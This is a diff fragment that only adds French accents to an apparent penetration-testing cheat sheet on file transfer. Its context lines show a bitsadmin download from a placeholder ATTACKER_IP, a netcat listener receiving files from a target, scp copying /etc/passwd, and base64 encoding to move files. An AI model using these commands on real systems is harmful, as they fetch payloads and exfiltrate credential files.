@@ -39,7 +39,7 @@ bitsadmin /transfer job /download /priority high http://ATTACKER_IP:8080/file C:
 
 ### Netcat
 ```bash
-# Attacker (reception)
+# Attacker (réception)
 nc -lvnp 9999 > received_file
 
 # Cible (envoi)
@@ -94,13 +94,13 @@ scp user@TARGET_IP:/etc/passwd ./passwd
 
 ---
 
-## Base64 (pas de transfert reseau)
+## Base64 (pas de transfert réseau)
 
 ```bash
 # Encoder sur la source
 base64 -w0 file.bin
 
-# Decoder sur la destination
+# Décoder sur la destination
 echo "BASE64_STRING" | base64 -d > file.bin
 
 # Windows
